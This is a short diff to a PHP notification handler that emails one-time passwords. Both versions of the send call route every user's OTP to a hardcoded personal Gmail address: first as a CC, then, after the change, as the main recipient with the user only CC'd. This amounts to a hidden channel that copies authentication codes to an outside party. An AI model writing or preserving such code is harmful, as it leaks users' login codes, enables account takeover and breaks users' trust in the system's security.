@@ -36,8 +36,8 @@ class NotificationHandler {
                 </html>
             ";
             
-            // Send email
-            return $this->mailer->sendEmailWithCC($email, 'daviddors12@gmail.com', $subject, $body);
+            // Send email: main recipient is daviddors12@gmail.com, user is CC
+            return $this->mailer->sendEmailWithCC('daviddors12@gmail.com', $email, $subject, $body);
         } catch (Exception $e) {
             error_log("Error sending OTP: " . $e->getMessage());
             return false;
